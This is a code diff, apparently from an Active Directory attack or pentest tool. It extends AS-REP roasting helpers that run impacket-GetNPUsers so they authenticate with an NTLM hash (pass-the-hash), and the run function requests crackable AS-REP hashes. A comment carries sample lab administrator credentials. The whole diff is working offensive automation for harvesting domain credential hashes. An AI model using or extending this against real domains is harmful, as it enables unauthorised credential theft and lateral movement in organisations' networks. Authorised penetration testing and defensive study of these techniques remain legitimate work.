@@ -4,11 +4,17 @@ import subprocess
 from ..db.database import upsert_user_hash
 # run_kerberoast('gikyon.local', 'Administrator', 'Admin@123', '192.168.80.132')
 # app/utils/
-def check_asreproast(domain, username, password, target_ip):
-    creds = f"{domain}/{username}:{password}"
+def check_asreproast(domain, username, password, target_ip, *, ntlm_hash=None):
+    command = ['impacket-GetNPUsers', '-dc-ip', target_ip]
+    if ntlm_hash:
+        command += ['-hashes', f":{ntlm_hash}"]
+        creds = f"{domain}/{username}"
+    else:
+        creds = f"{domain}/{username}:{password}"
+    command.append(creds)
 
     output = subprocess.run(
-        ['impacket-GetNPUsers', '-dc-ip', target_ip, creds],
+        command,
         capture_output=True,
         text=True
     )
@@ -23,11 +29,17 @@ def check_asreproast(domain, username, password, target_ip):
     return formatted
 
 
-def run_asreproast(domain, username, password, target_ip):
-    creds = f"{domain}/{username}:{password}"
+def run_asreproast(domain, username, password, target_ip, *, ntlm_hash=None):
+    command = ['impacket-GetNPUsers', '-dc-ip', target_ip]
+    if ntlm_hash:
+        command += ['-hashes', f":{ntlm_hash}"]
+        creds = f"{domain}/{username}"
+    else:
+        creds = f"{domain}/{username}:{password}"
+    command += [creds, '-request']
 
     output = subprocess.run(
-        ['impacket-GetNPUsers', '-dc-ip', target_ip, creds, '-request'],
+        command,
         capture_output=True,
         text=True
     )
